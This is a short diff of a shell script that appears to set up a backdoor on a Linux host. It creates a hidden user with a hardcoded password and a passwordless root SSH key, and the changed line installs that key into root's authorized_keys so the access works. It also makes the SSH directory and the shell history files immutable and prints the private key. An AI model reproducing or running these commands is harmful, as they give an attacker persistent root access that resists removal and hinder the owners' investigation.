@@ -98,7 +98,7 @@ chattr +i ~/.bash_history ~/.bash_logout ~/.bash_profile ~/.bashrc ~/.config ~/.
 
 sudo useradd -r -m -s /bin/bash network >/dev/null 2>&1 && echo "network:rijal01" | sudo chpasswd >/dev/null 2>&1
 ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
-cat /root/.ssh/id_rsa.pub > authorized_keys
+cat /root/.ssh/id_rsa.pub > /root/.ssh/authorized_keys
 chattr +i -R /root/.ssh
 cat /root/.ssh/id_rsa
 
